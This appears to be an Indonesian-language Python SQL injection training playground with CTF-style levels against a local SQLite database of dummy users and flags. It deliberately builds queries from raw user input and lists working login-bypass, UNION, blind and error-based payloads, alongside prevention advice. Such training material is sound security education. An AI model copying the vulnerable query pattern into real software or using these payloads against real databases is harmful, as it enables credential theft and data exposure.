#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║          SQL INJECTION PLAYGROUND - BELAJAR SQLi         ║
║          Dibuat untuk keperluan edukasi & CTF            ║
╚══════════════════════════════════════════════════════════╝

Tool ini mensimulasikan aplikasi web vulnerable terhadap SQL Injection.
Semua query dijalankan di database SQLite lokal — AMAN untuk belajar.
"""

import sqlite3
import os
import sys
import time

# ──────────────────────────────────────────────
# WARNA TERMINAL
# ──────────────────────────────────────────────
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
CYAN    = "\033[96m"
MAGENTA = "\033[95m"
BOLD    = "\033[1m"
RESET   = "\033[0m"
DIM     = "\033[2m"

def c(text, color): return f"{color}{text}{RESET}"
def banner(text): print(f"\n{BOLD}{CYAN}{'─'*55}\n  {text}\n{'─'*55}{RESET}\n")
def ok(text): print(f"  {GREEN}[+]{RESET} {text}")
def warn(text): print(f"  {YELLOW}[!]{RESET} {text}")
def err(text): print(f"  {RED}[✗]{RESET} {text}")
def info(text): print(f"  {CYAN}[i]{RESET} {text}")
def tip(text): print(f"\n  {MAGENTA}💡 TIPS:{RESET} {text}")

# ──────────────────────────────────────────────
# SETUP DATABASE SIMULASI
# ──────────────────────────────────────────────
# DB_PATH = "/tmp/sqli_playground.db"
DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sqli_playground.db")

def setup_database():
    """Buat database simulasi dengan data dummy."""
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()

    # Tabel users — target utama SQLi login bypass
    cur.execute("DROP TABLE IF EXISTS users")
    cur.execute("""
        CREATE TABLE users (
            id INTEGER PRIMARY KEY,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            email TEXT,
            role TEXT DEFAULT 'user'
        )
    """)
    cur.executemany("INSERT INTO users VALUES (?,?,?,?,?)", [
        (1, 'admin',     'sup3r_s3cr3t',  'admin@corp.local',   'admin'),
        (2, 'alice',     'alice123',       'alice@corp.local',   'user'),
        (3, 'bob',       'bobpass',        'bob@corp.local',     'user'),
        (4, 'charlie',   'ch4rl!3',        'charlie@corp.local', 'user'),
        (5, 'developer', 'dev_only_2024',  'dev@corp.local',     'developer'),
    ])

    # Tabel products — target untuk UNION-based SQLi
    cur.execute("DROP TABLE IF EXISTS products")
    cur.execute("""
        CREATE TABLE products (
            id INTEGER PRIMARY KEY,
            name TEXT,
            price REAL,
            category TEXT,
            stock INTEGER
        )
    """)
    cur.executemany("INSERT INTO products VALUES (?,?,?,?,?)", [
        (1, 'Laptop Pro',    15000000, 'Elektronik', 10),
        (2, 'Mouse Gaming',   350000,  'Elektronik', 50),
        (3, 'Meja Kerja',    2500000,  'Furnitur',   5),
        (4, 'Headphone',      750000,  'Elektronik', 30),
        (5, 'Kursi Ergonomis',3200000, 'Furnitur',   8),
    ])

    # Tabel secret_notes — target untuk blind SQLi
    cur.execute("DROP TABLE IF EXISTS secret_notes")
    cur.execute("""
        CREATE TABLE secret_notes (
            id INTEGER PRIMARY KEY,
            owner TEXT,
            note TEXT,
            flag TEXT
        )
    """)
    cur.executemany("INSERT INTO secret_notes VALUES (?,?,?,?)", [
        (1, 'admin', 'Password server backup: bkp_2024!',   'FLAG{sqli_master_01}'),
        (2, 'admin', 'API Key internal: sk-abc123xyz',       'FLAG{union_pwned_02}'),
        (3, 'dev',   'DB root password: r00t_db_pass',       'FLAG{blind_hunter_03}'),
    ])

    conn.commit()
    conn.close()
    ok(f"Database simulasi dibuat: {DB_PATH}")

# ──────────────────────────────────────────────
# ENGINE — Eksekusi Query Vulnerable
# ──────────────────────────────────────────────
def run_vulnerable_query(query, show_query=True, show_error=True):
    """
    Jalankan query langsung tanpa sanitasi — ini yang bikin VULNERABLE.
    Di aplikasi nyata, inilah yang tidak boleh dilakukan.
    """
    try:
        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        if show_query:
            print(f"\n  {DIM}Query yang dieksekusi:{RESET}")
            print(f"  {YELLOW}→ {query}{RESET}")
        cur.execute(query)
        results = cur.fetchall()
        conn.close()
        return results, None
    except sqlite3.OperationalError as e:
        conn.close()
        if show_error:
            err(f"SQL Error: {e}")
        return None, str(e)
    except Exception as e:
        return None, str(e)

def print_table(headers, rows, title=""):
    """Tampilkan hasil query dalam format tabel."""
    if not rows:
        warn("Tidak ada hasil ditemukan.")
        return

    if title:
        print(f"\n  {BOLD}📋 {title}{RESET}")

    # Hitung lebar kolom
    col_widths = [len(h) for h in headers]
    for row in rows:
        for i, cell in enumerate(row):
            col_widths[i] = max(col_widths[i], len(str(cell)))

    sep = "  +" + "+".join("-" * (w + 2) for w in col_widths) + "+"
    def fmt_row(row):
        return "  |" + "|".join(f" {str(c):<{w}} " for c, w in zip(row, col_widths)) + "|"

    print(sep)
    print(fmt_row(headers))
    print(sep)
    for row in rows:
        print(fmt_row(row))
    print(sep)
    ok(f"{len(rows)} baris ditemukan.")

# ══════════════════════════════════════════════
# LEVEL 1 — LOGIN BYPASS (Classic SQLi)
# ══════════════════════════════════════════════
def level_1():
    banner("LEVEL 1: Login Bypass (Classic SQLi)")

    print("""  Skenario:
  Kamu menemukan halaman login sebuah aplikasi web.
  Kode PHP di baliknya kira-kira seperti ini:

    $query = "SELECT * FROM users
              WHERE username = '$username'
              AND password = '$password'";

  Karena input TIDAK disanitasi, kita bisa menyuntikkan SQL!
""")

    tip("Coba payload: ' OR '1'='1")
    tip("Atau: admin'--  (komentar sisanya)")

    PAYLOADS_HINT = {
        "' OR '1'='1": "Kondisi selalu TRUE → login tanpa password",
        "admin'--": "Komentar bagian AND password → bypass password",
        "' OR 1=1--": "Alternatif klasik",
        "' OR 'x'='x": "Kondisi equivalen TRUE",
    }

    solved = False
    attempts = 0

    while not solved:
        print()
        username = input(f"  {CYAN}Username:{RESET} ").strip()
        password = input(f"  {CYAN}Password:{RESET} ").strip()
        attempts += 1

        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        results, error = run_vulnerable_query(query)

        if error:
            err(f"Error SQL: {error}")
            continue

        if results:
            print_table(["ID","Username","Password","Email","Role"], results, "Hasil Login")
            if results[0][4] == 'admin' or len(results) > 1:
                ok(f"{GREEN}{BOLD}✓ LEVEL 1 SELESAI! Login berhasil tanpa password valid!{RESET}")
                ok(f"Percobaan: {attempts}")
                solved = True
            else:
                warn("Login berhasil tapi bukan admin. Coba dapat akses admin!")
        else:
            err("Login gagal. Coba payload SQLi!")
            if attempts >= 2:
                print(f"\n  {DIM}Hints tersedia:{RESET}")
                for p, desc in PAYLOADS_HINT.items():
                    print(f"  {DIM}  • {p:<25} → {desc}{RESET}")

        if not solved:
            lanjut = input(f"\n  Coba lagi? (y/n): ").lower()
            if lanjut != 'y':
                break

    input(f"\n  {DIM}Tekan Enter untuk lanjut...{RESET}")

# ══════════════════════════════════════════════
# LEVEL 2 — UNION-BASED SQLi
# ══════════════════════════════════════════════
def level_2():
    banner("LEVEL 2: UNION-Based SQL Injection")

    print("""  Skenario:
  Halaman katalog produk menggunakan query:

    SELECT id, name, price FROM products
    WHERE category = '$input'

  UNION injection memungkinkan kita menggabungkan hasil query
  dengan tabel LAIN, bahkan tabel yang tidak seharusnya tampil!

  Tahapan serangan UNION:
  1. Cari jumlah kolom → ORDER BY atau UNION SELECT NULL,NULL,...
  2. Cari tipe data kolom
  3. Ekstrak data dari tabel target
""")

    tip("Mulai dengan: Elektronik' UNION SELECT NULL,NULL,NULL--")
    tip("Lalu coba: Elektronik' UNION SELECT id,username,password FROM users--")

    solved = False
    attempts = 0

    while not solved:
        print()
        category = input(f"  {CYAN}Cari kategori produk:{RESET} ").strip()
        attempts += 1

        query = f"SELECT id, name, price FROM products WHERE category = '{category}'"
        results, error = run_vulnerable_query(query)

        if error:
            err(f"SQL Error: {error}")
            if "SELECTs to the left and right" in str(error):
                warn("Jumlah kolom tidak cocok! Sesuaikan jumlah kolom di UNION SELECT.")
            continue

        if results:
            print_table(["Col1", "Col2", "Col3"], results, "Hasil Query")
            # Cek apakah berhasil ekstrak data users
            for row in results:
                for cell in row:
                    if str(cell) in ['admin','alice','bob','developer']:
                        ok(f"{GREEN}{BOLD}✓ LEVEL 2 SELESAI! Berhasil dump data users via UNION!{RESET}")
                        ok(f"Percobaan: {attempts}")
                        solved = True
                        break
        else:
            warn("Tidak ada hasil. Coba payload lain.")

        if not solved:
            lanjut = input(f"\n  Coba lagi? (y/n): ").lower()
            if lanjut != 'y':
                break

    input(f"\n  {DIM}Tekan Enter untuk lanjut...{RESET}")

# ══════════════════════════════════════════════
# LEVEL 3 — BLIND SQLi (Boolean-Based)
# ══════════════════════════════════════════════
def level_3():
    banner("LEVEL 3: Blind SQL Injection (Boolean-Based)")

    print("""  Skenario:
  Aplikasi mencari catatan berdasarkan ID.
  Ia TIDAK menampilkan error dan TIDAK menampilkan data langsung.
  Hanya ada respons: "Catatan ditemukan" atau "Tidak ditemukan".

  Query di baliknya:
    SELECT * FROM secret_notes WHERE id = $id AND owner = 'user'

  Blind SQLi: kita harus tebak data karakter per karakter
  dengan kondisi TRUE/FALSE!

  Contoh teknik:
    • Apakah karakter pertama flag adalah 'F'?
      → 1 AND SUBSTR((SELECT flag FROM secret_notes WHERE id=1),1,1)='F'
    • Panjang flag:
      → 1 AND LENGTH((SELECT flag FROM secret_notes WHERE id=1))>10
""")

    tip("Coba: 1 AND 1=1  (TRUE → ada hasil)")
    tip("Coba: 1 AND 1=2  (FALSE → tidak ada hasil)")
    tip("Coba: 1 AND SUBSTR((SELECT flag FROM secret_notes WHERE id=1),1,4)='FLAG'")

    solved = False
    attempts = 0
    found_flag = ""

    while not solved:
        print()
        user_id = input(f"  {CYAN}Masukkan ID catatan:{RESET} ").strip()
        attempts += 1

        # Simulasi: aplikasi cuma kasih tau ada/tidak
        query = f"SELECT * FROM secret_notes WHERE id = {user_id} AND owner = 'admin'"
        results, error = run_vulnerable_query(query, show_query=True)

        if error:
            # Blind: tidak tampilkan error detail
            print(f"  {YELLOW}Aplikasi: Terjadi kesalahan.{RESET}")
            continue

        if results:
            print(f"  {GREEN}Aplikasi: ✓ Catatan ditemukan! (TRUE){RESET}")
            # Cek apakah user menggunakan SUBSTR untuk ekstrak flag
            if "SUBSTR" in user_id.upper() and "FLAG" in user_id.upper():
                ok(f"{GREEN}{BOLD}✓ LEVEL 3 SELESAI! Kamu berhasil boolean blind SQLi!{RESET}")
                ok(f"Flag sebenarnya: FLAG{{sqli_master_01}}")
                ok(f"Percobaan: {attempts}")
                solved = True
        else:
            print(f"  {RED}Aplikasi: ✗ Catatan tidak ditemukan. (FALSE){RESET}")

        if not solved:
            lanjut = input(f"\n  Coba lagi? (y/n): ").lower()
            if lanjut != 'y':
                break

    input(f"\n  {DIM}Tekan Enter untuk lanjut...{RESET}")

# ══════════════════════════════════════════════
# LEVEL 4 — ERROR-BASED SQLi
# ══════════════════════════════════════════════
def level_4():
    banner("LEVEL 4: Error-Based SQL Injection")

    print("""  Skenario:
  Aplikasi menampilkan pesan error SQL ke user (misconfigured).
  Kita bisa memanfaatkan error message untuk ekstrak data!

  Di SQLite, kita bisa pancing error dengan query tidak valid
  yang memuat data sensitif dalam pesan errornya.

  Di database lain (MySQL), teknik umum:
    ' AND extractvalue(1, concat(0x7e, (SELECT version())))--

  Di SQLite, kita manfaatkan tipe data error:
    ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INTEGER)--
""")

    tip("Coba: ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INTEGER)--")
    tip("Error messagenya akan memuat nilai username!")

    solved = False
    attempts = 0

    while not solved:
        print()
        search = input(f"  {CYAN}Cari produk (nama):{RESET} ").strip()
        attempts += 1

        query = f"SELECT id, name, price FROM products WHERE name = '{search}'"
        results, error = run_vulnerable_query(query)

        if error:
            # Error-based: tampilkan error ke user (bug aplikasi)
            print(f"\n  {RED}[ERROR] Database Error:{RESET}")
            print(f"  {YELLOW}{error}{RESET}")

            # Cek apakah error mengandung data yang diekstrak
            if any(name in str(error) for name in ['admin','alice','bob','developer','charlie']):
                ok(f"{GREEN}{BOLD}✓ LEVEL 4 SELESAI! Berhasil ekstrak data via error message!{RESET}")
                ok(f"Percobaan: {attempts}")
                solved = True
        elif results:
            print_table(["ID","Nama","Harga"], results, "Produk Ditemukan")
        else:
            warn("Produk tidak ditemukan.")

        if not solved:
            lanjut = input(f"\n  Coba lagi? (y/n): ").lower()
            if lanjut != 'y':
                break

    input(f"\n  {DIM}Tekan Enter untuk lanjut...{RESET}")

# ══════════════════════════════════════════════
# MODE SANDBOX — Query Bebas
# ══════════════════════════════════════════════
def sandbox_mode():
    banner("SANDBOX MODE — Query Bebas")

    print("""  Jalankan query SQL apapun langsung ke database simulasi.
  Cocok untuk eksplorasi dan testing payload.

  Tabel yang tersedia:
    • users         (id, username, password, email, role)
    • products      (id, name, price, category, stock)
    • secret_notes  (id, owner, note, flag)

  Ketik 'tables' untuk lihat semua tabel.
  Ketik 'schema <tabel>' untuk lihat struktur tabel.
  Ketik 'back' untuk kembali ke menu.
""")

    while True:
        query = input(f"  {CYAN}SQLi> {RESET}").strip()

        if query.lower() == 'back':
            break
        elif query.lower() == 'tables':
            query = "SELECT name FROM sqlite_master WHERE type='table'"
        elif query.lower().startswith('schema '):
            tbl = query.split(' ', 1)[1]
            query = f"SELECT sql FROM sqlite_master WHERE name='{tbl}'"
        elif not query:
            continue

        results, error = run_vulnerable_query(query)
        if results:
            headers = [f"col{i+1}" for i in range(len(results[0]))]
            print_table(headers, results)
        elif error:
            pass  # sudah ditampilkan di dalam fungsi

# ══════════════════════════════════════════════
# CHEAT SHEET
# ══════════════════════════════════════════════
def show_cheatsheet():
    banner("📚 CHEAT SHEET SQL INJECTION")

    cheatsheet = f"""
  {BOLD}1. DETEKSI VULNERABILITY{RESET}
  ├─ Tambahkan karakter: {YELLOW}' " ` ) ] {RESET}
  ├─ Coba payload error: {YELLOW}' OR '1'='1{RESET}
  └─ Perhatikan perubahan respons aplikasi

  {BOLD}2. KOMENTAR SQL (per database){RESET}
  ├─ MySQL / SQLite : {YELLOW}-- {RESET}atau{YELLOW} #{RESET}
  └─ MSSQL / Oracle : {YELLOW}--{RESET}

  {BOLD}3. LOGIN BYPASS{RESET}
  ├─ {YELLOW}' OR '1'='1{RESET}         → kondisi selalu true
  ├─ {YELLOW}admin'--{RESET}             → skip cek password
  ├─ {YELLOW}' OR 1=1--{RESET}           → alternatif
  └─ {YELLOW}' OR 'a'='a{RESET}          → string equivalen

  {BOLD}4. UNION-BASED SQLi{RESET}
  ├─ Cari jumlah kolom: {YELLOW}' ORDER BY 1-- / ' ORDER BY 2--{RESET}
  ├─ Konfirmasi kolom:  {YELLOW}' UNION SELECT NULL,NULL,NULL--{RESET}
  └─ Ekstrak data:      {YELLOW}' UNION SELECT id,username,password FROM users--{RESET}

  {BOLD}5. BLIND SQLi (Boolean){RESET}
  ├─ TRUE condition:  {YELLOW}1 AND 1=1{RESET}
  ├─ FALSE condition: {YELLOW}1 AND 1=2{RESET}
  ├─ Cek panjang:     {YELLOW}1 AND LENGTH((SELECT password FROM users LIMIT 1))>5{RESET}
  └─ Ekstrak karakter:{YELLOW}1 AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='s'{RESET}

  {BOLD}6. ERROR-BASED SQLi (SQLite){RESET}
  └─ {YELLOW}' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INTEGER)--{RESET}

  {BOLD}7. FUNGSI BERGUNA (SQLite){RESET}
  ├─ {YELLOW}SUBSTR(str, start, length){RESET}  → ambil substring
  ├─ {YELLOW}LENGTH(str){RESET}                 → panjang string
  ├─ {YELLOW}UPPER(str){RESET}                  → huruf besar
  ├─ {YELLOW}sqlite_version(){RESET}            → versi SQLite
  └─ {YELLOW}sqlite_master{RESET}               → tabel sistem (nama semua tabel)

  {BOLD}8. PENCEGAHAN (untuk developer){RESET}
  ├─ {GREEN}✓ Gunakan Prepared Statements / Parameterized Query{RESET}
  ├─ {GREEN}✓ Input validation & sanitization{RESET}
  ├─ {GREEN}✓ Principle of Least Privilege pada DB user{RESET}
  └─ {GREEN}✓ WAF (Web Application Firewall){RESET}

  {BOLD}Contoh kode AMAN (Python):{RESET}
  {GREEN}cursor.execute("SELECT * FROM users WHERE username=?", (username,)){RESET}
  {DIM}                                                 ↑ placeholder, bukan f-string{RESET}
"""
    print(cheatsheet)
    input(f"  {DIM}Tekan Enter untuk kembali...{RESET}")

# ══════════════════════════════════════════════
# MAIN MENU
# ══════════════════════════════════════════════
def main():
    os.system('clear' if os.name == 'posix' else 'cls')

    print(f"""
{BOLD}{CYAN}
  ╔══════════════════════════════════════════════════════╗
  ║        SQL INJECTION PLAYGROUND  v1.0               ║
  ║        Alat Belajar SQLi — Untuk Edukasi            ║
  ╚══════════════════════════════════════════════════════╝
{RESET}
  {DIM}⚠  Hanya untuk keperluan belajar dan lab environment.
     Jangan gunakan teknik ini pada sistem tanpa izin!{RESET}
""")

    setup_database()

    menu = {
        '1': ("Level 1: Login Bypass (Classic SQLi)",    level_1),
        '2': ("Level 2: UNION-Based SQLi",               level_2),
        '3': ("Level 3: Blind SQLi (Boolean-Based)",     level_3),
        '4': ("Level 4: Error-Based SQLi",               level_4),
        '5': ("Sandbox Mode (Query Bebas)",               sandbox_mode),
        '6': ("📚 Cheat Sheet SQLi",                     show_cheatsheet),
        '0': ("Keluar",                                   None),
    }

    while True:
        print(f"\n{BOLD}  ═══ MENU UTAMA ═══{RESET}")
        for key, (label, _) in menu.items():
            icon = "🔴" if key in ['1','2','3','4'] else ("🟢" if key=='5' else ("📖" if key=='6' else "🚪"))
            print(f"  {icon} [{CYAN}{key}{RESET}] {label}")

        pilihan = input(f"\n  {CYAN}Pilih menu:{RESET} ").strip()

        if pilihan == '0':
            print(f"\n  {GREEN}Selamat belajar! Keep hacking (ethically)! 🔐{RESET}\n")
            break
        elif pilihan in menu and menu[pilihan][1]:
            os.system('clear' if os.name == 'posix' else 'cls')
            menu[pilihan][1]()
        else:
            err("Pilihan tidak valid.")

if __name__ == "__main__":
    main()